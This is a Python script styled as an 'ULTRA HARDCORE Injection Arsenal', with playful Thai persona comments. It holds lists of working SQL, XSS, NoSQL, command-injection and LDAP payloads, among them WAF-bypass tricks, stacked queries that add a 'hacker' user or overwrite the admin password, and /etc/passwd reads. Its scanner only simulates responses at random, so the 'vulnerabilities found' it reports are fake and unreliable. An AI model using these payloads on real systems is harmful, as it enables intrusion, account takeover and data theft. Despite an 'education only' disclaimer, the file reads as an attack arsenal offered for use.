#!/usr/bin/env python3
"""
🔥💀 ULTRA HARDCORE Injection Arsenal 💀🔥
⚠️  เพื่อการศึกษาเท่านั้น! ⚠️

น้องต้องการเห็นเทคนิคขั้น **ULTRA HARDCORE** ใช่มั้ยคะ? 😈✨ 
เจ้าจะแสดงให้ดูเทคนิคระดับ **NATION-STATE** เลยนะคะ! 
แต่ใช้เพื่อการศึกษาเท่านั้นนะจ๊ะ! 💀💖
"""

import asyncio
import aiohttp
import random
import time
import threading
import queue
import hashlib
import json
import sqlite3
import itertools
from concurrent.futures import ThreadPoolExecutor
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass
import numpy as np
import re
import base64
import urllib.parse
from collections import defaultdict
import gc
import psutil

@dataclass
class InjectionPayload:
    """Structure for injection payloads"""
    name: str
    payload: str
    type: str
    severity: int
    description: str

class UltraHardcoreInjectionArsenal:
    """
    🔥💀 ULTRA HARDCORE Injection Arsenal 💀🔥
    เทคนิคการ inject ขั้นเทพ สำหรับการศึกษาเท่านั้น!
    """
    
    def __init__(self):
        print("🔥💀 Initializing ULTRA HARDCORE Injection Arsenal 💀🔥")
        
        # 🎯 Advanced payload databases
        self.sql_payloads = self._generate_sql_payloads()
        self.xss_payloads = self._generate_xss_payloads()
        self.nosql_payloads = self._generate_nosql_payloads()
        self.command_payloads = self._generate_command_payloads()
        self.ldap_payloads = self._generate_ldap_payloads()
        
        # 🧠 AI-powered payload generation
        self.dynamic_payloads = []
        self.success_patterns = defaultdict(list)
        
        # 📊 Attack statistics
        self.injection_stats = {
            'attempts': 0,
            'successful_injections': 0,
            'detected_vulnerabilities': [],
            'bypassed_filters': []
        }
        
        # 🔧 Advanced configuration
        self.setup_database()
        self.load_encoding_techniques()
        
    def setup_database(self):
        """สร้าง database สำหรับเก็บผลการ injection"""
        print("📊 Setting up injection tracking database...")
        self.conn = sqlite3.connect(':memory:')
        
        self.conn.execute('''
            CREATE TABLE injection_results (
                id INTEGER PRIMARY KEY,
                target_url TEXT,
                payload_type TEXT,
                payload TEXT,
                response_code INTEGER,
                response_time REAL,
                response_length INTEGER,
                success BOOLEAN,
                vulnerability_detected TEXT,
                timestamp DATETIME
            )
        ''')
        
        self.conn.execute('''
            CREATE TABLE bypass_techniques (
                id INTEGER PRIMARY KEY,
                filter_type TEXT,
                original_payload TEXT,
                bypassed_payload TEXT,
                success_rate REAL,
                target_system TEXT
            )
        ''')
        
        self.conn.commit()
        print("✅ Injection database initialized!")

    def _generate_sql_payloads(self) -> List[InjectionPayload]:
        """สร้าง SQL injection payloads ขั้นสูง"""
        print("💉 Generating advanced SQL injection payloads...")
        
        payloads = [
            # Basic SQL injections
            InjectionPayload("Union Select", "' UNION SELECT 1,2,3,4,5--", "SQL", 5, "Basic union select"),
            InjectionPayload("Error Based", "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "SQL", 4, "Error-based extraction"),
            
            # Time-based blind injections
            InjectionPayload("Time Blind MySQL", "' AND IF(1=1, SLEEP(5), 0)--", "SQL", 4, "Time-based blind MySQL"),
            InjectionPayload("Time Blind PostgreSQL", "'; SELECT pg_sleep(5)--", "SQL", 4, "Time-based blind PostgreSQL"),
            InjectionPayload("Time Blind MSSQL", "'; WAITFOR DELAY '00:00:05'--", "SQL", 4, "Time-based blind MSSQL"),
            
            # Boolean-based blind injections
            InjectionPayload("Boolean Blind", "' AND SUBSTRING(@@version,1,1)='5", "SQL", 3, "Boolean-based blind"),
            
            # Advanced bypass techniques
            InjectionPayload("WAF Bypass 1", "/*!50000UNION*/ /*!50000SELECT*/ 1,2,3--", "SQL", 5, "Comment-based WAF bypass"),
            InjectionPayload("WAF Bypass 2", "uni/**/on sel/**/ect 1,2,3--", "SQL", 5, "Comment insertion bypass"),
            InjectionPayload("Case Variation", "UnIoN sElEcT 1,2,3--", "SQL", 3, "Case variation bypass"),
            
            # Advanced SQL injections
            InjectionPayload("Stacked Queries", "'; INSERT INTO users VALUES('hacker','password123');--", "SQL", 5, "Stacked query injection"),
            InjectionPayload("Second Order", "admin'; UPDATE users SET password='hacked' WHERE username='admin'--", "SQL", 5, "Second-order injection"),
        ]
        
        # Generate dynamic payloads
        for i in range(10):
            dynamic_payload = self._generate_dynamic_sql_payload()
            payloads.append(dynamic_payload)
        
        print(f"✅ Generated {len(payloads)} SQL injection payloads!")
        return payloads

    def _generate_dynamic_sql_payload(self) -> InjectionPayload:
        """สร้าง SQL payload แบบ dynamic"""
        techniques = [
            "' OR 1=1--",
            "' OR 'a'='a",
            "' OR 1=1#",
            "admin'--",
            "admin'/*",
            "' OR 1=1/*",
        ]
        
        base = random.choice(techniques)
        
        # เพิ่ม encoding หรือ obfuscation
        if random.random() < 0.3:
            base = urllib.parse.quote(base)
        
        if random.random() < 0.2:
            base = base.replace(' ', '/**/')
        
        return InjectionPayload(
            f"Dynamic SQL {random.randint(1000, 9999)}",
            base,
            "SQL",
            random.randint(2, 5),
            "Dynamically generated SQL injection"
        )

    def _generate_xss_payloads(self) -> List[InjectionPayload]:
        """สร้าง XSS payloads ขั้นสูง"""
        print("🎭 Generating advanced XSS payloads...")
        
        payloads = [
            # Basic XSS
            InjectionPayload("Basic Alert", "<script>alert('XSS')</script>", "XSS", 3, "Basic alert XSS"),
            InjectionPayload("Document Cookie", "<script>alert(document.cookie)</script>", "XSS", 4, "Cookie stealing XSS"),
            
            # Advanced XSS
            InjectionPayload("Event Handler", "<img src=x onerror=alert('XSS')>", "XSS", 4, "Event handler XSS"),
            InjectionPayload("SVG XSS", "<svg onload=alert('XSS')>", "XSS", 4, "SVG-based XSS"),
            InjectionPayload("JavaScript URL", "javascript:alert('XSS')", "XSS", 3, "JavaScript URL XSS"),
            
            # Filter bypass XSS
            InjectionPayload("Script Bypass", "<scr<script>ipt>alert('XSS')</script>", "XSS", 4, "Script tag bypass"),
            InjectionPayload("Encoding Bypass", "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E", "XSS", 4, "URL encoding bypass"),
            InjectionPayload("Unicode Bypass", "<script>alert\\u0028\\u0027XSS\\u0027\\u0029</script>", "XSS", 4, "Unicode bypass"),
            
            # Advanced techniques
            InjectionPayload("DOM XSS", "<iframe src=\"javascript:alert('XSS')\"></iframe>", "XSS", 5, "DOM-based XSS"),
            InjectionPayload("AngularJS", "{{constructor.constructor('alert(1)')()}}", "XSS", 5, "AngularJS template injection"),
            InjectionPayload("VueJS", "<div v-html=\"$root.constructor.constructor('alert(1)')()\">" , "XSS", 5, "VueJS template injection"),
        ]
        
        # Generate obfuscated payloads
        for i in range(5):
            obfuscated = self._generate_obfuscated_xss()
            payloads.append(obfuscated)
        
        print(f"✅ Generated {len(payloads)} XSS payloads!")
        return payloads

    def _generate_obfuscated_xss(self) -> InjectionPayload:
        """สร้าง XSS payload ที่ obfuscated"""
        base_scripts = [
            "alert('XSS')",
            "alert(document.domain)", 
            "alert(document.cookie)",
            "console.log('XSS')"
        ]
        
        script = random.choice(base_scripts)
        
        # Obfuscation techniques
        techniques = [
            lambda s: s.replace('alert', 'window["al"+"ert"]'),
            lambda s: "eval(atob('" + base64.b64encode(s.encode()).decode() + "'))",
            lambda s: s.replace('(', '\\u0028').replace(')', '\\u0029'),
            lambda s: f"setTimeout('{s}', 0)"
        ]
        
        technique = random.choice(techniques)
        obfuscated_script = technique(script)
        
        return InjectionPayload(
            f"Obfuscated XSS {random.randint(1000, 9999)}",
            f"<script>{obfuscated_script}</script>",
            "XSS",
            4,
            "Obfuscated XSS payload"
        )

    def _generate_nosql_payloads(self) -> List[InjectionPayload]:
        """สร้าง NoSQL injection payloads"""
        print("🍃 Generating NoSQL injection payloads...")
        
        payloads = [
            # MongoDB injections
            InjectionPayload("MongoDB Auth Bypass", "{'$ne': null}", "NoSQL", 4, "MongoDB authentication bypass"),
            InjectionPayload("MongoDB OR", "{'$or': [{'username': 'admin'}, {'username': 'administrator'}]}", "NoSQL", 4, "MongoDB OR injection"),
            InjectionPayload("MongoDB Regex", "{'username': {'$regex': '.*admin.*'}}", "NoSQL", 3, "MongoDB regex injection"),
            
            # JSON injections
            InjectionPayload("JSON Auth Bypass", '{"username": {"$ne": null}, "password": {"$ne": null}}', "NoSQL", 4, "JSON authentication bypass"),
            InjectionPayload("JSON Where", '{"username": "admin", "$where": "this.username == this.password"}', "NoSQL", 5, "JSON where injection"),
            
            # CouchDB injections
            InjectionPayload("CouchDB Map Reduce", '{"map": "function() { emit(null, JSON.stringify(this)); }"}', "NoSQL", 4, "CouchDB map-reduce injection"),
        ]
        
        print(f"✅ Generated {len(payloads)} NoSQL payloads!")
        return payloads

    def _generate_command_payloads(self) -> List[InjectionPayload]:
        """สร้าง Command injection payloads"""
        print("⚡ Generating command injection payloads...")
        
        payloads = [
            # Basic command injections
            InjectionPayload("Command Concat", "; ls -la", "CMD", 5, "Command concatenation"),
            InjectionPayload("Command Pipe", "| cat /etc/passwd", "CMD", 5, "Command pipe injection"),
            InjectionPayload("Command AND", " && whoami", "CMD", 4, "Command AND injection"),
            InjectionPayload("Command OR", " || id", "CMD", 4, "Command OR injection"),
            
            # Advanced command injections
            InjectionPayload("Backtick Execution", "`whoami`", "CMD", 4, "Backtick command execution"),
            InjectionPayload("Subshell", "$(whoami)", "CMD", 4, "Subshell command execution"),
            
            # Filter bypass
            InjectionPayload("Space Bypass", ";cat</etc/passwd", "CMD", 5, "Space character bypass"),
            InjectionPayload("Wildcard Bypass", "/b?n/c?t /etc/passwd", "CMD", 4, "Wildcard bypass"),
            
            # Windows commands
            InjectionPayload("Windows Dir", " & dir", "CMD", 4, "Windows directory listing"),
            InjectionPayload("Windows Type", " & type C:\\Windows\\System32\\drivers\\etc\\hosts", "CMD", 5, "Windows file read"),
        ]
        
        print(f"✅ Generated {len(payloads)} command injection payloads!")
        return payloads

    def _generate_ldap_payloads(self) -> List[InjectionPayload]:
        """สร้าง LDAP injection payloads"""
        print("🔐 Generating LDAP injection payloads...")
        
        payloads = [
            InjectionPayload("LDAP Auth Bypass", "*)(uid=*))(|(uid=*", "LDAP", 4, "LDAP authentication bypass"),
            InjectionPayload("LDAP Wildcard", "*", "LDAP", 3, "LDAP wildcard injection"),
            InjectionPayload("LDAP OR", ")(|(cn=*", "LDAP", 4, "LDAP OR injection"),
            InjectionPayload("LDAP Blind", "*)(mail=*))%00", "LDAP", 4, "LDAP blind injection"),
        ]
        
        print(f"✅ Generated {len(payloads)} LDAP payloads!")
        return payloads

    def load_encoding_techniques(self):
        """โหลดเทคนิคการ encode payload"""
        print("🔐 Loading advanced encoding techniques...")
        
        self.encoding_techniques = {
            'url': urllib.parse.quote,
            'double_url': lambda s: urllib.parse.quote(urllib.parse.quote(s)),
            'html': lambda s: ''.join(f'&#x{ord(c):x};' for c in s),
            'unicode': lambda s: ''.join(f'\\u{ord(c):04x}' for c in s),
            'base64': lambda s: base64.b64encode(s.encode()).decode(),
            'hex': lambda s: ''.join(f'\\x{ord(c):02x}' for c in s),
        }
        
        print("✅ Encoding techniques loaded!")

    async def test_injection_point(self, url: str, parameter: str, payloads: List[InjectionPayload]) -> Dict:
        """ทดสอบ injection point ด้วย payloads หลายตัว"""
        print(f"🎯 Testing injection point: {url} - parameter: {parameter}")
        
        results = {
            'url': url,
            'parameter': parameter,
            'vulnerabilities_found': [],
            'successful_payloads': [],
            'total_tests': len(payloads),
            'test_duration': 0
        }
        
        start_time = time.time()
        
        for i, payload in enumerate(payloads):
            print(f"💉 [{i+1}/{len(payloads)}] Testing {payload.name}...")
            
            # Apply random encoding
            encoded_payload = self._apply_random_encoding(payload.payload)
            
            # จำลองการทดสอบ (เพื่อการศึกษา)
            response = await self._simulate_injection_test(url, parameter, encoded_payload)
            
            # วิเคราะห์ response
            vulnerability = self._analyze_response(response, payload)
            
            if vulnerability:
                results['vulnerabilities_found'].append(vulnerability)
                results['successful_payloads'].append(payload.name)
                print(f"✅ Vulnerability detected: {vulnerability['type']}")
            
            # เก็บสถิติ
            self._record_injection_attempt(url, payload, response)
            
            # Delay เพื่อไม่ให้เป็น flood
            await asyncio.sleep(random.uniform(0.1, 0.5))
        
        results['test_duration'] = time.time() - start_time
        
        print(f"📊 Testing completed! Found {len(results['vulnerabilities_found'])} vulnerabilities")
        return results

    def _apply_random_encoding(self, payload: str) -> str:
        """ใช้ encoding แบบสุ่มกับ payload"""
        if random.random() < 0.3:  # 30% chance of encoding
            encoding_name = random.choice(list(self.encoding_techniques.keys()))
            encoder = self.encoding_techniques[encoding_name]
            try:
                encoded = encoder(payload)
                print(f"🔐 Applied {encoding_name} encoding")
                return encoded
            except:
                return payload
        return payload

    async def _simulate_injection_test(self, url: str, parameter: str, payload: str) -> Dict:
        """จำลองการทดสอบ injection (เพื่อการศึกษา)"""
        # จำลอง HTTP request
        await asyncio.sleep(random.uniform(0.1, 0.3))  # Simulate network delay
        
        # จำลอง response patterns
        vulnerable_indicators = [
            'mysql_fetch_array',
            'ORA-01756',
            'Microsoft OLE DB Provider',
            'Unclosed quotation mark',
            'syntax error',
            '500 Internal Server Error'
        ]
        
        # สุ่มว่า payload จะสำเร็จหรือไม่
        is_vulnerable = random.random() < 0.1  # 10% chance
        
        if is_vulnerable:
            response_text = f"Error: {random.choice(vulnerable_indicators)} - {payload}"
            status_code = random.choice([200, 500])
        else:
            response_text = "Normal response content"
            status_code = 200
        
        return {
            'status_code': status_code,
            'response_text': response_text,
            'response_time': random.uniform(0.1, 2.0),
            'response_length': len(response_text),
            'headers': {'Content-Type': 'text/html'}
        }

    def _analyze_response(self, response: Dict, payload: InjectionPayload) -> Optional[Dict]:
        """วิเคราะห์ response เพื่อหาช่องโหว่"""
        # ตรวจหา error indicators
        error_indicators = [
            'mysql_fetch_array', 'ORA-01756', 'Microsoft OLE DB Provider',
            'Unclosed quotation mark', 'syntax error', 'Warning: mysql_',
            'You have an error in your SQL syntax', 'PostgreSQL query failed'
        ]
        
        response_text = response.get('response_text', '').lower()
        
        for indicator in error_indicators:
            if indicator.lower() in response_text:
                return {
                    'type': payload.type,
                    'severity': payload.severity,
                    'indicator': indicator,
                    'payload': payload.payload,
                    'description': f"Detected {payload.type} vulnerability via error message",
                    'response_code': response.get('status_code'),
                    'response_time': response.get('response_time')
                }
        
        # ตรวจหา timing-based injections
        if payload.type == 'SQL' and 'sleep' in payload.payload.lower():
            if response.get('response_time', 0) > 4:  # ถ้าใช้เวลานานกว่า 4 วินาที
                return {
                    'type': 'Time-Based SQL Injection',
                    'severity': 4,
                    'indicator': 'Long response time',
                    'payload': payload.payload,
                    'description': 'Detected time-based SQL injection',
                    'response_code': response.get('status_code'),
                    'response_time': response.get('response_time')
                }
        
        return None

    def _record_injection_attempt(self, url: str, payload: InjectionPayload, response: Dict):
        """บันทึกผลการทดสอบ injection"""
        vulnerability_detected = self._analyze_response(response, payload)
        success = vulnerability_detected is not None
        
        self.conn.execute('''
            INSERT INTO injection_results 
            (target_url, payload_type, payload, response_code, response_time, 
             response_length, success, vulnerability_detected, timestamp)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            url, payload.type, payload.payload, response.get('status_code'),
            response.get('response_time'), response.get('response_length'),
            success, json.dumps(vulnerability_detected) if vulnerability_detected else None,
            time.time()
        ))
        
        self.conn.commit()
        
        # อัพเดทสถิติ
        self.injection_stats['attempts'] += 1
        if success:
            self.injection_stats['successful_injections'] += 1

    async def hardcore_injection_scan(self, target_urls: List[str], parameters: List[str]):
        """สแกน injection ขั้นโหดสำหรับหลาย targets"""
        print("🔥💀 Starting HARDCORE Injection Scan 💀🔥")
        
        all_payloads = (
            self.sql_payloads + self.xss_payloads + 
            self.nosql_payloads + self.command_payloads + self.ldap_payloads
        )
        
        total_tests = len(target_urls) * len(parameters) * len(all_payloads)
        print(f"🎯 Total tests to perform: {total_tests}")
        
        results = []
        
        for url in target_urls:
            for param in parameters:
                print(f"\n🔍 Scanning {url} - parameter: {param}")
                
                # ทดสอบทุกประเภท payload
                result = await self.test_injection_point(url, param, all_payloads)
                results.append(result)
                
                # แสดงผลลัพธ์เบื้องต้น
                if result['vulnerabilities_found']:
                    print(f"⚠️ Found {len(result['vulnerabilities_found'])} vulnerabilities!")
                    for vuln in result['vulnerabilities_found']:
                        print(f"   💥 {vuln['type']} - Severity: {vuln['severity']}")
        
        # สรุปผลลัพธ์
        self._generate_injection_report(results)
        
        return results

    def _generate_injection_report(self, results: List[Dict]):
        """สร้างรายงานผลการสแกน injection"""
        print("\n📊 HARDCORE Injection Scan Report")
        print("=" * 60)
        
        total_vulns = sum(len(r['vulnerabilities_found']) for r in results)
        total_tests = sum(r['total_tests'] for r in results)
        
        print(f"🎯 Total targets scanned: {len(results)}")
        print(f"🔍 Total tests performed: {total_tests}")
        print(f"💥 Total vulnerabilities found: {total_vulns}")
        print(f"📈 Success rate: {(self.injection_stats['successful_injections']/self.injection_stats['attempts']*100):.2f}%")
        
        # สถิติตามประเภท vulnerability
        vuln_types = defaultdict(int)
        for result in results:
            for vuln in result['vulnerabilities_found']:
                vuln_types[vuln['type']] += 1
        
        if vuln_types:
            print(f"\n💀 Vulnerabilities by type:")
            for vuln_type, count in vuln_types.items():
                print(f"   {vuln_type}: {count}")
        
        # เก็บรายงานลงไฟล์
        report_file = f"injection_report_{int(time.time())}.json"
        with open(report_file, 'w') as f:
            json.dump({
                'scan_results': results,
                'statistics': self.injection_stats,
                'vulnerability_types': dict(vuln_types),
                'timestamp': time.time()
            }, f, indent=2)
        
        print(f"💾 Report saved to: {report_file}")

    def get_hardcore_stats(self) -> Dict:
        """ดึงสถิติการทำงานแบบ hardcore"""
        return {
            'total_attempts': self.injection_stats['attempts'],
            'successful_injections': self.injection_stats['successful_injections'],
            'success_rate': (self.injection_stats['successful_injections'] / max(self.injection_stats['attempts'], 1)) * 100,
            'payload_types_tested': len(self.sql_payloads) + len(self.xss_payloads) + len(self.nosql_payloads),
            'encoding_techniques': len(self.encoding_techniques)
        }

# 🚀 Advanced Demo Functions
async def demo_sql_injection():
    """Demo SQL injection testing"""
    arsenal = UltraHardcoreInjectionArsenal()
    
    print("💉 Demonstrating SQL Injection Testing...")
    
    # Test URLs (สำหรับการศึกษาเท่านั้น)
    test_urls = [
        "https://testphp.vulnweb.com/artists.php",
        "https://demo.testfire.net/bank/main.jsp"
    ]
    
    parameters = ["id", "username", "search", "q"]
    
    # ทดสอบเฉพาะ SQL payloads
    for url in test_urls[:1]:  # ทดสอบเฉพาะ URL แรก
        for param in parameters[:2]:  # ทดสอบเฉพาะ 2 parameters แรก
            result = await arsenal.test_injection_point(url, param, arsenal.sql_payloads[:5])
            print(f"Tested {url} - {param}: {len(result['vulnerabilities_found'])} vulnerabilities found")

async def demo_xss_testing():
    """Demo XSS testing"""
    arsenal = UltraHardcoreInjectionArsenal()
    
    print("🎭 Demonstrating XSS Testing...")
    
    test_urls = ["https://xss-game.appspot.com/level1/frame"]
    parameters = ["query", "input", "message"]
    
    for url in test_urls:
        for param in parameters[:1]:  # ทดสอบเฉพาะ parameter แรก
            result = await arsenal.test_injection_point(url, param, arsenal.xss_payloads[:5])
            print(f"XSS Test {url} - {param}: {len(result['vulnerabilities_found'])} vulnerabilities found")

async def ultimate_injection_demo():
    """Ultimate demonstration ของทุกเทคนิค"""
    print("💀🔥 ULTIMATE INJECTION DEMONSTRATION 🔥💀")
    print("=" * 60)
    
    arsenal = UltraHardcoreInjectionArsenal()
    
    # URLs สำหรับทดสอบ (เฉพาะเพื่อการศึกษา)
    test_targets = [
        "https://httpbin.org/get",  # Safe testing endpoint
        "https://jsonplaceholder.typicode.com/posts/1"  # Safe JSON endpoint
    ]
    
    parameters = ["id", "q", "search", "input"]
    
    print("🚀 Starting comprehensive injection testing...")
    
    # รัน hardcore scan
    results = await arsenal.hardcore_injection_scan(test_targets, parameters[:2])
    
    # แสดงสถิติสุดท้าย
    stats = arsenal.get_hardcore_stats()
    print(f"\n🎯 ULTIMATE STATISTICS:")
    print(f"💥 Total injection attempts: {stats['total_attempts']}")
    print(f"✅ Successful injections: {stats['successful_injections']}")
    print(f"📊 Success rate: {stats['success_rate']:.2f}%")
    print(f"🔧 Payload types tested: {stats['payload_types_tested']}")

# Memory monitoring
class MemoryOptimizer:
    @staticmethod
    def monitor_memory():
        try:
            process = psutil.Process()
            memory_info = process.memory_info()
            print(f"📊 Memory Usage: {memory_info.rss / 1024 / 1024:.2f} MB")
        except:
            print("📊 Memory monitoring unavailable")
    
    @staticmethod
    def optimize():
        gc.collect()
        print("🗑️ Memory optimized")

# Main execution
async def main():
    print("💀🔥 ULTRA HARDCORE INJECTION ARSENAL 🔥💀")
    print("⚠️  WARNING: เพื่อการศึกษาเท่านั้น!")
    print("⚠️  ห้ามใช้โจมตีระบบของผู้อื่น!")
    print("=" * 60)
    
    optimizer = MemoryOptimizer()
    optimizer.monitor_memory()
    
    print("\n🎯 Available demos:")
    print("1. SQL Injection Demo")
    print("2. XSS Testing Demo")
    print("3. Ultimate Injection Demo")
    
    choice = input("Select demo (1, 2, or 3): ").strip()
    
    if choice == "1":
        await demo_sql_injection()
    elif choice == "2":
        await demo_xss_testing()
    elif choice == "3":
        await ultimate_injection_demo()
    else:
        print("🔥 Running SQL injection demo by default...")
        await demo_sql_injection()
    
    optimizer.optimize()
    print("\n💡 🎓 Remember: Use only for educational purposes!")

if __name__ == "__main__":
    asyncio.run(main())
